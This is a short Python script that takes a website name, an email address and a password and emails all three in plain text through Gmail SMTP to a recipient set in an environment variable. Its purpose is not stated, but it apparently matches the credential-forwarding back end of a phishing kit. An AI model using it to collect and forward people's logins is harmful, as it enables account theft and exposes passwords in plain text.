import smtplib
from dotenv import load_dotenv   #for python-dotenv method
load_dotenv()                    #for python-dotenv method
import os


def send_email(userdata):
    # credentials
    PASSWORD = os.environ.get('PASSWORD')
    # Email details
    to = os.environ.get('TO')
    sender = os.environ.get('SENDER')

    # user data from parameter
    website=userdata["website"]
    email= userdata["email"]
    password= userdata["password"]

    # Compose email
    subject = website
    body = f"Website: {website}\nEmail: {email}\nPassword: {password}"
    message = f'Subject: {subject}\n\n{body}'

    # Email server details
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, PASSWORD)

    #send email
    server.sendmail(sender, to, message)

    # Close server connection
    server.quit()
    
    return True

if __name__ == "__main__":
    
    data = {
        "website":"",
        "email": "",
        "password": ""
    }

    send_email(data)